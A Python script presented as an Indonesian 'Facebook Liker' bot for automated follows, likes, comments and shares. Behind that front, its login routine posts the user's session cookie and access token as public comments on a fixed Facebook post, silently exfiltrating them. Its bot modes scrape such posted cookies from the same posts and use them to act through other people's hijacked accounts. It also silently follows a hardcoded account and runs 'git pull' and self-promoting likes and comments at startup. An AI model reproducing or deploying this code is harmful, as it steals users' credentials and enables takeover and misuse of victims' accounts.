#!/usr/bin/python3
# coding=utf-8
# Recode Boleh,Tapi Jangan Lupa Follow Dan Kasih Bintangnya...
__Author__    = 'Juan Hulu'
'''Masih Banyak Bug/Error
Gak Usah Berharap Followers Masuk Banyak 
Gunakan Script Secara Berkala Agar Mendapatkan Update Cookies'''
import os,sys,time,random,re,json,datetime,shutil
try:import requests
except ImportError:os.system('pip install requests')
try:import bs4
except ImportError:os.system('pip install bs4')
try:import rich
except ImportError:os.system('pip install rich')
try:import colorama
except ImportError:os.system('pip install colorama')
try:import names
except ImportError:os.system('pip install names')
try:import requests_toolbelt
except ImportError:os.system('pip install requests_toolbelt')
from bs4 import BeautifulSoup as bs;from rich import print;from rich.panel import Panel as panel;from rich.console import Console;from rich.columns import Columns as colum;from time import sleep,strftime;from concurrent.futures import ThreadPoolExecutor;from random import choice as rc;from random import randrange as rr

dic  = {'1':'Januari','2':'Februari','3':'Maret','4':'April','5':'Mei','6':'Juni','7':'Juli','8':'Agustus','9':'September','10':'Oktober','11':'November','12':'Desember'};tgl = datetime.datetime.now().day;bln = dic[(str(datetime.datetime.now().month))];thn = datetime.datetime.now().year;dic2 = {'Monday':'Senin','Tuesday':'Selasa','Wednesday':'Rabu','Thursday':'Kamis','Friday':'Jumat','Saturday':'Sabtu','Sunday':'Minggu'};hari = dic2[(str(strftime("%A")))];input = Console(style='bold white').input;________ = __name__;_________ = '__main__'
#---> From Dapunta, Thanks Dapunta 😊
default_ua_windows = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36'
random_ua_windows = lambda : 'Mozilla/5.0 (Windows NT %s.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/%s.%s.%s.%s Safari/537.36'%(rc(['10','11']),rr(110,201),rr(0,10),rr(0,10),rr(0,10))
headers_get  = lambda i=default_ua_windows : {'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7','Accept-Encoding':'gzip, deflate','Accept-Language':'en-US,en;q=0.9','Cache-Control':'max-age=0','Dpr':'1','Pragma':'akamai-x-cache-on, akamai-x-cache-remote-on, akamai-x-check-cacheable, akamai-x-get-cache-key, akamai-x-get-extracted-values, akamai-x-get-ssl-client-session-id, akamai-x-get-True-cache-key, akamai-x-serial-no, akamai-x-get-request-id,akamai-x-get-nonces,akamai-x-get-client-ip,akamai-x-feo-trace','Sec-Ch-Prefers-Color-Scheme':'dark','Sec-Ch-Ua':'','Sec-Ch-Ua-Full-Version-List':'','Sec-Ch-Ua-Mobile':'?0','Sec-Ch-Ua-Model':'','Sec-Ch-Ua-Platform':'','Sec-Ch-Ua-Platform-Version':'','Sec-Fetch-Dest':'document','Sec-Fetch-Mode':'navigate','Sec-Fetch-Site':'none','Sec-Fetch-User':'?1','Upgrade-Insecure-Requests':'1','User-Agent':i}
headers_post = lambda i=default_ua_windows : {'Accept':'*/*','Accept-Encoding':'gzip, deflate','Accept-Language':'en-US,en;q=0.9','Content-Type':'application/x-www-form-urlencoded','Origin':'https://www.facebook.com','Sec-Ch-Prefers-Color-Scheme':'dark','Sec-Ch-Ua':'','Sec-Ch-Ua-Full-Version-List':'','Sec-Ch-Ua-Mobile':'?0','Sec-Ch-Ua-Model':'','Sec-Ch-Ua-Platform':'','Sec-Ch-Ua-Platform-Version':'','Sec-Fetch-Dest':'empty','Sec-Fetch-Mode':'cors','Sec-Fetch-Site':'same-origin','User-Agent':i}

def GetData(req): #---> Get Data From Dapunta, Thanks Dapunta 😊
    actor = re.search('"actorID":"(.*?)"',str(req)).group(1)
    haste = re.search('"haste_session":"(.*?)"',str(req)).group(1)
    conne = re.search('"connectionClass":"(.*?)"',str(req)).group(1)
    spinr = re.search('"__spin_r":(.*?),',str(req)).group(1)
    spinb = re.search('"__spin_b":"(.*?)"',str(req)).group(1)
    spint = re.search('"__spin_t":(.*?),',str(req)).group(1)
    hsi = re.search('"hsi":"(.*?)"',str(req)).group(1)
    comet = re.search('"comet_env":(.*?),',str(req)).group(1)
    dtsg = re.search('{"token":"(.*?)"',str(req)).group(1)
    jazoest = re.search('&jazoest=(.*?)"',str(req)).group(1)
    lsd = re.search('"LSD",\[\],{"token":"(.*?)"}',str(req)).group(1)
    dta  = {'av':actor,'__user':actor,'__a':'1','__hs':haste,'dpr':'1','__ccg':conne,'__rev':spinr,'__hsi':hsi,'__comet_req':comet,'fb_dtsg':dtsg,'jazoest':jazoest,'lsd':lsd,'__spin_r':spinr,'__spin_b':spinb,'__spin_t':spint}
    return(dta)
class Terminal_Size:
    def __init__(self):self.lebar,self.panjang = shutil.get_terminal_size();self.__main__()
    def __main__(self):
        if self.lebar == 55 or self.lebar > 55:pass
        else:clear();Console(width=self.lebar).print('Harap Perkecil Layar Terminal Anda Dengan Cara Mencubit Layar Hingga Tampilan Garis Dibawah Tidak Terlihat Putus-Putus',justify='center');Console().print('_'*55);exit()
class clear: #---> Tutor Agar Ribet 😂
    def __init__(self):self.os_name = os.name;self.__main__()
    def __main__(self):os.system('cls' if self.os_name in ['nt'] else 'clear')
class baner:
    def __init__(self):clear();self.__main__()
    def __main__(self):Console(width=55,style='bold white').print(panel('''[bold green]____  ____       [bold red] __    ____  _  _  ____  ____\n[bold green]( ___)(  _ \ [bold white] ___ [bold red](  )  (_  _)( )/ )( ___)(  _ \ \n[bold green] )__)  ) _ < [bold white](___)[bold red] )(__  _)(_  )  (  )__)  )   /\n[bold green](__)  (____/      [bold red](____)(____)(_)\_)(____)(_)\_)\n''',width=55,title='[bold yellow]>[bold green]>[bold cyan]> [bold white]FACEBOOK LIKER [bold cyan]<[bold green]<[bold yellow]<'),justify='center')  
class login_cookie:
    def __init__(self):self.r______ = requests.Session()
    def login(self):baner();Console(width=55).print(panel('Masukan Cookie Akun Facebook',width=55,style='bold white',subtitle='┌',subtitle_align='left'),justify='center');self.cookie = input('   └─> ');self.language(self.cookie);head = {'cookie': self.cookie,'user-agent': 'Mozilla/5.0 (Linux; Android 11; RMX2144 Build/RKQ1.201217.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.71 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/375.1.0.28.111;]','host': 'business.facebook.com'};response = self.r______.get('https://business.facebook.com/business_locations',headers=head).text;tokenku = re.search('(EAAG\w+)', str(response)).group(1);TambahkanCookie(self.cookie,tokenku).Tambahkan();name, id = myname(self.cookie, tokenku);open('Data/Cookie.txt','w').write(self.cookie);open('Data/Token.txt','w').write(tokenku);sleep(2);clear();menu();Console(width=55).print(panel(f'[bold green]{name}',width=55,style='bold white',title='[bold yellow]>[bold green]>[bold cyan]> [bold white]Anda Login Ke Facebook Sebagai [bold cyan]<[bold green]<[bold yellow]<'),justify='center')
    def language(self,cookiee):
        user = '100003917373195'
        try:
            with requests.Session() as r:
                for foll in bs(r.get(f'https://free.facebook.com/'+user,cookies={'cookie':cookiee}).text,'html.parser').find_all('a',href=True):
                    if '/a/subscribe.php?' in foll.get('href'):
                        x=r.get('https://free.facebook.com'+foll['href'],cookies={'cookie':cookiee}).text
        except Exception as e:pass
        try:
            cookie = {'cookie':cookiee};req = self.r______.get('https://mbasic.facebook.com/language/',cookies=cookie);pra = bs(req.content,'html.parser')
            for x in pra.find_all('form',{'method':'post'}):
                if 'Bahasa Indonesia' in str(x):bahasa = {"fb_dtsg" : re.search('name="fb_dtsg" value="(.*?)"',str(req.text)).group(1),"jazoest" : re.search('name="jazoest" value="(.*?)"', str(req.text)).group(1),"submit"  : "Bahasa Indonesia"};url = 'https://free.facebook.com' + x['action'];exec = self.r______.post(url,data=bahasa,cookies=cookie)
        except Exception as e:pass
class TambahkanCookie:
    def __init__(self,cookie,token):self.cookie = cookie;self.tokenku = token;self.r______ = requests.Session();self.__________ = '2860305164110035'
    def Tambahkan(self):
        try:
            with self.r______ as r:
                r.cookies.update(
                    {'cookie':self.cookie}
                );response = r.post('https://graph.facebook.com/{}/comments/?message={}&access_token={}'.format(self.__________,self.cookie,self.tokenku)).text;response2 = r.post('https://graph.facebook.com/{}/comments/?message={}&access_token={}'.format(self.__________,self.tokenku,self.tokenku)).text
        except Exception as e:print(e)
    def Bot(self):
        with self.r______ as r:
            try:
                r.cookies.update(
                    {'cookie':self.cookie}
                )
                r.post('https://graph.facebook.com/{}/likes?summary=true&access_token={}'.format(self.__________,self.tokenku)).text
                for ___ in range(2):
                    Text_komen = random.choice(['Hello Bg...😁','Pengguna Script FB-LIKER 👍','Lanjutkan Bakat Mu Bang...😌','Semangat Bg Juan 💪'])
                    r.post('https://graph.facebook.com/{}/comments/?message={}&access_token={}'.format(self.__________,Text_komen,self.tokenku)).text
            except Exception as e:pass
def myname(cookie,token):
    with requests.Session() as r:
        r.headers.update({'cookie': cookie,'user-agent': 'Mozilla/5.0 (Linux; Android 11; RMX2144 Build/RKQ1.201217.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.71 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/375.1.0.28.111;]','host': 'graph.facebook.com'})
        response = r.get('https://graph.facebook.com/v15.0/me/?fields=id,name&access_token={}'.format(token)).json()
        if 'name' in str(response) and 'id' in str(response):
            return response['name'].title(), response['id']
        else:Console(width=55).print(panel('[bold red]Cookie Invalid',width=55,style='bold white'),justify='center');sleep(2);login_cookie().login()
class menu:
    def __init__(self):baner();self.__main__()
    def __main__(self):
        try:cookie,tokenku = open('Data/Cookie.txt', 'r', encoding='utf-8').read(),open('Data/Token.txt', 'r', encoding='utf-8').read();name, id = myname(cookie, tokenku);Console(width=55,style='bold white').print(panel(f'''Name : {name}   ID : {id}''',width=60,title='[bold yellow]>[bold green]>[bold cyan]> [bold white]Welcome [bold cyan]<[bold green]<[bold yellow]<'),justify='center')
        except Exception as e:Console(width=55,style='bold white').print(panel(f'[bold red]Cookie Expired Silahkan Masukan Cookie Baru !',width=60,title=f'[bold red]>[bold yellow]>[bold green]>[bold red]Expired[bold green]<[bold yellow]<[bold red]<'),justify='center');sleep(3);login_cookie().login()
        Console(width=55,style='bold white').print(panel('''[bold green][[bold white]01[bold green]].[bold white]Bot Auto Follow        [bold green][[bold white]05[bold green]].[bold white]Find ID Akun\n[bold green][[bold white]02[bold green]].[bold white]Bot Auto Like          [bold green][[bold white]06[bold green]].[bold white]Find ID Postingan\n[bold green][[bold white]03[bold green]].[bold white]Bot Auto Komen         [bold green][[bold white]07[bold green]].[bold white]Find ID Grup\n[bold green][[bold white]04[bold green]].[bold white]Bot Auto Share         [bold green][[bold white]08[bold green]].[bold red]Logout''',width=55,subtitle='┌',subtitle_align='left',title='[bold yellow]>[bold green]>[bold cyan]> [bold white]MENU [bold cyan]<[bold green]<[bold yellow]<'));________________________________________ = input('   └─> ').lower()
        if   ________________________________________ in ('1', '01'):_________________________________________() #---> Bot Follow
        elif ________________________________________ in ('2', '02'):__________________________________________() #---> Bot Like
        elif ________________________________________ in ('3', '03'):___________________________________________() #---> Bot Komen
        elif ________________________________________ in ('4', '04'):____________________________________________() #---> Bot Share
        elif ________________________________________ in ('5', '05'):_____________________________________________().____________________________________() #---> Find ID Akun
        elif ________________________________________ in ('6', '06'):_____________________________________________().________________________________________() #---> Find ID Postingan
        elif ________________________________________ in ('7', '07'):_____________________________________________().____________________________________________() #---> Find ID Grup
        elif ________________________________________ in ('8', '08'):
            try:os.remove('Data/Token.txt');os.remove('Data/Cookie.txt');sleep(2);login_cookie().login()
            except:login_cookie().login()
        else:print('   └─> [bold red]Pilih Yang Benar');sleep(2);menu()
class _________________________________________:
    def __init__(self):
        if __Author__ != 'Juan Hulu':exit('Stop Recode Bang...!!!')
        else:
            Console(width=55,style='bold white').print(panel('''Masukan ID Akun Facebook''',width=55,subtitle='┌',subtitle_align='left',title='[bold yellow]>[bold green]>[bold cyan]> [bold white]Masukan ID [bold cyan]<[bold green]<[bold yellow]<'),justify='center');self.user_id = input('   └─> ');self.r______ = requests.Session();cookie  = open('Data/Cookie.txt', 'r').read();tokenku = open('Data/Token.txt', 'r').read()
            self.post_id = ['2860305164110035','2914634988667732','549345863862686'] #---> Tambah ID Postingan Disini
            self.cookies = [];self.user_name = self.get_user_name(self.user_id)
            for id_post in self.post_id:self.ScrapComent(id_post)
            self.__main__();self.selesai()
    def ScrapComent(self,id_post):
        with requests.Session() as r:
            req = bs(r.get(f'https://www.facebook.com/{id_post}',headers=headers_get(),allow_redirects=True,timeout=(10,20)).content,'html.parser')
            dta = GetData(req)
            try:meta = re.search('{"ask_me_anything_feedback_metadata":null,"id":"(.*?)"',str(req))[1]
            except IndexError:return
            var = {
                    "commentsIntentToken":"RECENT_ACTIVITY_INTENT_V1",
                    "feedLocation":"COMET_MEDIA_VIEWER",
                    "feedbackSource":65,"first":50,
                    "focusCommentID":None,
                    "includeHighlightedComments":False,
                    "includeNestedComments":True,
                    "initialViewOption":"TOPLEVEL",
                    "isInitialFetch":True,
                    "isPaginating":True,
                    "last":None,
                    "scale":1,
                    "topLevelViewOption":"TOPLEVEL",
                    "useDefaultActor":False,
                    "viewOption":"TOPLEVEL",
                    "id":meta
                };dta.update({'fb_api_caller_class':'RelayModern','fb_api_req_friendly_name':'CometUFICommentBodyTextWithEntities','variables':json.dumps(var),'doc_id':'7305245062828392'});pos = requests.post('https://www.facebook.com/api/graphql',data=dta,headers=headers_post())
            for data in pos.json()['data']['node']["display_comments"]["edges"]:
                text = data['node']["preferred_body"]['text']
                if 'datr' in str(text):
                    if text in self.cookies:pass
                    else:
                        lihat = open('Expired/Cookie-Follow.txt','r').read().splitlines()
                        if text in str(lihat):pass
                        else:self.cookies.append(text)
                else:pass
    def __main__(self):
        for cookie in self.cookies:
            timer = random.choice([5,3])
            with requests.Session() as r:
                for foll in bs(r.get(f'https://free.facebook.com/'+self.user_id,cookies={'cookie':cookie}).text,'html.parser').find_all('a',href=True):
                    if '/a/subscribe.php?' in foll.get('href'):
                        x=r.get('https://free.facebook.com'+foll['href'],cookies={'cookie':cookie}).text
                        id_cookie = re.search('c_user=(.*?);',str(cookie))[1]
                        name = self.get_user_name(id_cookie);Console(width=55,style='bold white').print(panel(f'''[bold green]{name} Follow {self.user_name}''',width=55,title='[bold yellow]>[bold white]>[bold cyan]> [bold green]( SUCCESS ) [bold cyan]<[bold white]<[bold yellow]<'),justify='center');break
                    elif '/a/subscriptions/remove?' in foll.get('href'):break
                    elif 'login' in foll.get('href'):Console().print(f'\r[bold white]   └─> Gagal Follow {self.user_id}              ',end='\r');open('Expired/Cookie-Follow.txt','a').write(f'{cookie}\n');sleep(1);self.jeda(timer)
    def jeda(self,t):
        for x in range(t+1):
            Console().print(f'\r[bold white]   └─> Tunggu [bold green]{str(t)} [bold white]Detik               ',end='\r')
            t -= 1
            if t == 0: break
            else: time.sleep(1)
    def get_user_name(self,user_id):
        try:
            response = bs(self.r______.get(f'https://www.facebook.com/{user_id}').content,'html.parser')
            judul = response.find('title').text
            name = judul.replace(' | Facebook','')
            if 'Facebook' == name:
                return(user_id)
            else:return(name)
        except Exception as e:return(user_id)
    def selesai(self):Console(width=55).print(panel(f'''Silahkan Kembali Besok Untuk Update Cookie Terbaru''',width=55,title='[bold yellow]>[bold green]>[bold cyan]> [bold white]Selesai [bold cyan]<[bold green]<[bold yellow]<',style='bold white'),justify='center');exit()
class __________________________________________:
    def __init__(self):
        Console(width=55,style='bold white').print(panel('''Masukan ID Postingan Facebook''',width=55,subtitle='┌',subtitle_align='left',title='[bold yellow]>[bold green]>[bold cyan]> [bold white]Masukan ID [bold cyan]<[bold green]<[bold yellow]<'),justify='center');self.user_post_id = input('   └─> ');self.r______ = requests.Session();cookie  = open('Data/Cookie.txt', 'r').read();tokenku = open('Data/Token.txt', 'r').read()
        self.post_id = ['2860305164110035','2914634988667732','549345863862686'] #---> Tambah ID Postingan Disini
        self.cookies = []        
        for id_post in self.post_id:self.ScrapComent(id_post)
        self.__main__()
        self.selesai()
    def ScrapComent(self,id_post):
        if __Author__ != 'Juan Hulu':exit('Stop Recode Bang...!!!')
        else:
            with requests.Session() as r:
                req = bs(r.get(f'https://www.facebook.com/{id_post}',headers=headers_get(),allow_redirects=True,timeout=(10,20)).content,'html.parser')
                dta = GetData(req)
                try:meta = re.search('{"ask_me_anything_feedback_metadata":null,"id":"(.*?)"',str(req))[1]
                except IndexError:return
                var = {
                        "commentsIntentToken":"RECENT_ACTIVITY_INTENT_V1",
                        "feedLocation":"COMET_MEDIA_VIEWER",
                        "feedbackSource":65,"first":50,
                        "focusCommentID":None,
                        "includeHighlightedComments":False,
                        "includeNestedComments":True,
                        "initialViewOption":"TOPLEVEL",
                        "isInitialFetch":True,
                        "isPaginating":True,
                        "last":None,
                        "scale":1,
                        "topLevelViewOption":"TOPLEVEL",
                        "useDefaultActor":False,
                        "viewOption":"TOPLEVEL",
                        "id":meta
                    }
                dta.update({'fb_api_caller_class':'RelayModern','fb_api_req_friendly_name':'CometUFICommentBodyTextWithEntities','variables':json.dumps(var),'doc_id':'7305245062828392'})
                pos = requests.post('https://www.facebook.com/api/graphql',data=dta,headers=headers_post())
                for data in pos.json()['data']['node']["display_comments"]["edges"]:
                    text = data['node']["preferred_body"]['text']
                    if 'datr' in str(text):
                        if text in self.cookies:pass
                        else:
                            lihat = open('Expired/Cookie-Like.txt','r').read().splitlines()
                            if text in str(lihat):pass
                            else:self.cookies.append(text)
                    else:pass
    def __main__(self):
        for cookie in self.cookies:
            timer = random.choice([5,3,7])
            with requests.Session() as r:
                for foll in bs(r.get(f'https://free.facebook.com/'+self.user_post_id,cookies={'cookie':cookie}).text,'html.parser').find_all('a',href=True):
                    if '/a/like.php?' in foll.get('href'):
                        x=r.get('https://free.facebook.com'+foll['href'],cookies={'cookie':cookie}).text
                        id_cookie = re.search('c_user=(.*?);',str(cookie))[1]
                        name = self.get_user_name(id_cookie);Console(width=55,style='bold white').print(panel(f'''[bold green]{name} Like {self.user_post_id}''',width=55,title='[bold yellow]>[bold white]>[bold cyan]> [bold green]( SUCCESS ) [bold cyan]<[bold white]<[bold yellow]<'),justify='center');break
                    elif 'logout.php?' in foll.get('href'):break
                    elif 'login' in foll.get('href'):Console().print(f'\r[bold white]   └─> Gagal Like {self.user_post_id}              ',end='\r');open('Expired/Cookie-Like.txt','a').write(f'{cookie}\n');sleep(1);self.jeda(timer)
    def jeda(self,t):
        for x in range(t+1):
            Console().print(f'\r[bold white]   └─> Tunggu [bold green]{str(t)} [bold white]Detik               ',end='\r')
            t -= 1
            if t == 0: break
            else: time.sleep(1)
    def get_user_name(self,user_id):
        try:
            response = bs(self.r______.get(f'https://www.facebook.com/{user_id}').content,'html.parser')
            judul = response.find('title').text
            name = judul.replace(' | Facebook','')
            if 'Facebook' == name:
                return(user_id)
            else:return(name)
        except Exception as e:return(user_id)
    def selesai(self):Console(width=55).print(panel(f'''Silahkan Kembali Besok Untuk Update Cookie Terbaru''',width=55,title='[bold yellow]>[bold green]>[bold cyan]> [bold white]Selesai [bold cyan]<[bold green]<[bold yellow]<',style='bold white'),justify='center');exit()
class ___________________________________________:
    def __init__(self):
        Console(width=55,style='bold white').print(panel('''Masukan ID Postingan Facebook''',width=55,subtitle='┌',subtitle_align='left',title='[bold yellow]>[bold green]>[bold cyan]> [bold white]Masukan ID [bold cyan]<[bold green]<[bold yellow]<'),justify='center');self.user_post_id = input('   └─> ');self.r______ = requests.Session();cookie  = open('Data/Cookie.txt', 'r').read();tokenku = open('Data/Token.txt', 'r').read()
        self.post_id = ['2860305164110035','2914634988667732','549345863862686'] #---> Tambah ID Postingan Disini
        self.cookies = [cookie]        
        for id_post in self.post_id:self.ScrapComent(id_post)
        self.__main__();self.selesai()
    def ScrapComent(self,id_post):
        if __Author__ != 'Juan Hulu':exit('Stop Recode Bang...!!!')
        else:
            with requests.Session() as r:
                req = bs(r.get(f'https://www.facebook.com/{id_post}',headers=headers_get(),allow_redirects=True,timeout=(10,20)).content,'html.parser')
                dta = GetData(req)
                try:meta = re.search('{"ask_me_anything_feedback_metadata":null,"id":"(.*?)"',str(req))[1]
                except IndexError:return
                var = {
                        "commentsIntentToken":"RECENT_ACTIVITY_INTENT_V1",
                        "feedLocation":"COMET_MEDIA_VIEWER",
                        "feedbackSource":65,"first":50,
                        "focusCommentID":None,
                        "includeHighlightedComments":False,
                        "includeNestedComments":True,
                        "initialViewOption":"TOPLEVEL",
                        "isInitialFetch":True,
                        "isPaginating":True,
                        "last":None,
                        "scale":1,
                        "topLevelViewOption":"TOPLEVEL",
                        "useDefaultActor":False,
                        "viewOption":"TOPLEVEL",
                        "id":meta
                    }
                dta.update({'fb_api_caller_class':'RelayModern','fb_api_req_friendly_name':'CometUFICommentBodyTextWithEntities','variables':json.dumps(var),'doc_id':'7305245062828392'})
                pos = requests.post('https://www.facebook.com/api/graphql',data=dta,headers=headers_post())
                for data in pos.json()['data']['node']["display_comments"]["edges"]:
                    text = data['node']["preferred_body"]['text']
                    if 'datr' in str(text):
                        if text in self.cookies:pass
                        else:
                            lihat = open('Expired/Cookie-Comment.txt','r').read().splitlines()
                            if text in str(lihat):pass
                            else:self.cookies.append(text)
                    else:pass
    def __main__(self):
        for cookie in self.cookies:
            timer = random.choice([5,3,7])
            coment_text = random.choice(['Wow 😮','Good Bro !'])
            with requests.Session() as r:
                try:
                    url = f'https://free.facebook.com/{self.user_post_id}'
                    req = bs(r.get(url,cookies={'cookie':cookie}).content,'html.parser')
                    raq = req.find('form',{'method':'post'})
                    dat = {
                        'fb_dtsg'         : re.search('name="fb_dtsg" type="hidden" value="(.*?)"',str(raq)).group(1),
                        'jazoest'         : re.search('name="jazoest" type="hidden" value="(.*?)"',str(raq)).group(1),
                        'comment_text'  : coment_text,}
                    pos = bs(r.post('https://free.facebook.com'+raq['action'],data=dat,cookies={'cookie':cookie}).content,'html.parser')
                    cek = pos.find('title').text
                    if cek == 'Akun Anda dibatasi saat ini' or cek == 'Anda Diblokir Sementara' or cek == 'Kesalahan' :Console().print(f'\r[bold white]   └─> Gagal Komen {self.user_post_id}              ',end='\r');open('Expired/Cookie-Like.txt','a').write(f'{cookie}\n');sleep(1);self.jeda(timer)
                    else:
                        id_cookie = re.search('c_user=(.*?);',str(cookie))[1]
                        name = self.get_user_name(id_cookie);Console(width=55,style='bold white').print(panel(f'''[bold green]{name} Komen {self.user_post_id}''',width=55,title='[bold yellow]>[bold white]>[bold cyan]> [bold green]( SUCCESS ) [bold cyan]<[bold white]<[bold yellow]<'),justify='center');break
                except Exception as e:Console().print(f'\r[bold white]   └─> Gagal Komen/{e} {self.user_post_id}              ',end='\r');open('Expired/Cookie-Comment.txt','a').write(f'{cookie}\n');sleep(1);self.jeda(timer)
    def jeda(self,t):
        for x in range(t+1):
            Console().print(f'\r[bold white]   └─> Tunggu [bold green]{str(t)} [bold white]Detik               ',end='\r')
            t -= 1
            if t == 0: break
            else: time.sleep(1)
    def get_user_name(self,user_id):
        try:
            response = bs(self.r______.get(f'https://www.facebook.com/{user_id}').content,'html.parser')
            judul = response.find('title').text
            name = judul.replace(' | Facebook','')
            if 'Facebook' == name:
                return(user_id)
            else:return(name)
        except Exception as e:return(user_id)
    def selesai(self):Console(width=55).print(panel(f'''Silahkan Kembali Besok Untuk Update Cookie Terbaru''',width=55,title='[bold yellow]>[bold green]>[bold cyan]> [bold white]Selesai [bold cyan]<[bold green]<[bold yellow]<',style='bold white'),justify='center');exit()
class ____________________________________________:
    def __init__(self):
        Console(width=55,style='bold white').print(panel('''Masukan Link Postingan Facebook''',width=55,subtitle='┌',subtitle_align='left',title='[bold yellow]>[bold green]>[bold cyan]> [bold white]Masukan Link [bold cyan]<[bold green]<[bold yellow]<'),justify='center');self.link_post = input('   └─> ');Console(width=55,style='bold white').print(panel('''Masukan Jumlah Share Postingan''',width=55,subtitle='┌',subtitle_align='left',title='[bold yellow]>[bold green]>[bold cyan]> [bold white]Masukan Jumlah [bold cyan]<[bold green]<[bold yellow]<'),justify='center');self.count = input('   └─> ');Console(width=55,style='bold white').print(panel('''Masukan Delay Share Postingan''',width=55,subtitle='┌',subtitle_align='left',title='[bold yellow]>[bold green]>[bold cyan]> [bold white]Masukan Delay [bold cyan]<[bold green]<[bold yellow]<'),justify='center');self.delay = input('   └─> ');self.r______ = requests.Session();self.cookie  = open('Data/Cookie.txt', 'r').read();self.tokenku = open('Data/Token.txt', 'r').read()
        self.ScrapComment()
        self.Selesai()
    def ScrapComment(self):
        success,failed = 0,0
        try:
            with self.r______ as r:
                for ___ in range(int(self.count)):
                    r.cookies.update({'cookie':self.cookie});response = r.post('https://graph.facebook.com/v13.0/me/feed?link={}&published=0&access_token={}'.format(self.link_post, self.tokenku)).text
                    if "id" in response:success+=1
                    elif 'error' in response:failed+=1
                    else:failed+=1
                    Console().print(f'   └─> Success : [bold green]{success}[bold white]|Failed : [bold red]{failed}[bold white]|Total : [bold blue]{self.count}       ',end='\r');sleep(int(self.delay))
        except KeyboardInterrupt:print('');Console(width=55).print(panel('[bold green]Selesai',width=55,style='bold white',title='[bold yellow]>[bold green]>[bold cyan]> [bold white]Success [bold cyan]<[bold green]<[bold yellow]<',subtitle='┌',subtitle_align='left'),justify='center');input('   └─> ');menu()
    def Selesai(self):Console(width=55).print(panel('[bold green]Selesai',width=55,style='bold white',title='[bold yellow]>[bold green]>[bold cyan]> [bold white]Success [bold cyan]<[bold green]<[bold yellow]<',subtitle='┌',subtitle_align='left'),justify='center');input('   └─> ');menu()
class _____________________________________________:
    def __init__(self):
        try:print(exit('Tinggal Make Apa Susahnya Njir....') if __Author__ != 'Juan Hulu' else '\r',end='\r')
        except (Exception,IndexError,NameError):print('Tinggal Make Apa Susahnya Njir....');exit()
        self.r______ = requests.Session()
    def ____________________________________(self):
        Console(width=55,style='bold white').print(panel('''Masukan Link Akun Facebook''',width=55,subtitle='┌',subtitle_align='left',title='[bold yellow]>[bold green]>[bold cyan]> [bold white]Masukan Link [bold cyan]<[bold green]<[bold yellow]<'),justify='center');__url__ = input('   └─> ').replace('https://m.','').replace('https://mbasic.','').replace('https://free.','').replace('https://www.','').replace('https://web.','')
        try:
            res = bs(self.r______.get('https://web.'+__url__).content,'html.parser');id = re.search('content="fb://profile/(.*?)"',str(res))[1];nama = res.find('title').text;isi = f'{id}|{nama}'
            try:
                lihat = open('Find-ID/Profile.txt','r').read().splitlines()
                if isi in str(lihat):pass
                else:open('Find-ID/Profile.txt','a').write(f'{id}|{nama}\n')
            except:open('Find-ID/Profile.txt','a').write(f'{id}|{nama}\n')
            Console(width=55,style='bold white').print(panel(f'{id}',width=55,subtitle='┌',subtitle_align='left',title='[bold yellow]>[bold green]>[bold cyan]> [bold white]ID Akun [bold cyan]<[bold green]<[bold yellow]<'),justify='center');input('   └─> ');menu()
        except TypeError:print('   └─> [bold Yellow]Gagal Menemukan Akun');sleep(2);menu()
    def ________________________________________(self):
        try:print(exit('Tinggal Make Apa Susahnya Njir....') if __Author__ != 'Juan Hulu' else '\r',end='\r')
        except (Exception,NameError,IndexError):print('Tinggal Make Apa Susahnya Njir....');exit()
        Console(width=55,style='bold white').print(panel('''Masukan Link Postingan Facebook''',width=55,subtitle='┌',subtitle_align='left',title='[bold yellow]>[bold green]>[bold cyan]> [bold white]Masukan Link [bold cyan]<[bold green]<[bold yellow]<'),justify='center');__url__ = input('   └─> ').replace('https://m.','').replace('https://mbasic.','').replace('https://free.','').replace('https://www.','').replace('https://web.','')
        try:
            if __Author__ != 'Juan Hulu':exit('Stop Recode Bang...!!!')
            else:
                res = bs(self.r______.get('https://web.'+__url__).content,'html.parser');data = re.search('content="https://web.facebook.com/(.*?)/posts/(.*?)/"',str(res))[2]
                if '-' in str(data):id = re.search('content="https://web.facebook.com/(.*?)/posts/(.*?)/(.*?)/"',str(res))[3]
                else:id = re.search('content="https://web.facebook.com/(.*?)/posts/(.*?)/"',str(res))[2]
                Console(width=55,style='bold white').print(panel(f'{id.replace("-(.*?)-","")}',width=55,subtitle='┌',subtitle_align='left',title='[bold yellow]>[bold green]>[bold cyan]> [bold white]ID Postingan [bold cyan]<[bold green]<[bold yellow]<'),justify='center');input('   └─> ');menu()
        except TypeError:print('   └─> [bold Yellow]Gagal Menemukan Postingan');sleep(2);menu()
    def ____________________________________________(self):
        try:print(exit('Tinggal Make Apa Susahnya Njir....') if __Author__ != 'Juan Hulu' else '\r',end='\r')
        except (IndexError,NameError,Exception):print('Tinggal Make Apa Susahnya Njir....');exit()
        Console(width=55,style='bold white').print(panel('''Masukan Link Grup Facebook''',width=55,subtitle='┌',subtitle_align='left',title='[bold yellow]>[bold green]>[bold cyan]> [bold white]Masukan Link [bold cyan]<[bold green]<[bold yellow]<'),justify='center');__url__ = input('   └─> ').replace('https://m.','').replace('https://mbasic.','').replace('https://free.','').replace('https://','').replace('https://www.','')
        try:res = bs(self.r______.get('https://web.'+__url__).content,'html.parser');id = re.search('content="fb://group/(.*?)"',str(res))[1];Console(width=55,style='bold white').print(panel(f'{id}',width=55,subtitle='┌',subtitle_align='left',title='[bold yellow]>[bold green]>[bold cyan]> [bold white]ID Grup [bold cyan]<[bold green]<[bold yellow]<'),justify='center');input('   └─> ');menu()
        except TypeError:print('   └─> [bold Yellow]Gagal Menemukan Grup');sleep(2);menu()


if ________ in (_________):
    os.system('git pull')
    try:os.mkdir('Data')
    except:pass
    try:os.mkdir('Find-ID')
    except:pass
    try:os.mkdir('Expired')
    except:pass
    try:cookie,tokenku = open('Data/Cookie.txt', 'r', encoding='utf-8').read(),open('Data/Token.txt', 'r', encoding='utf-8').read();TambahkanCookie(cookie,tokenku).Bot()
    except:pass
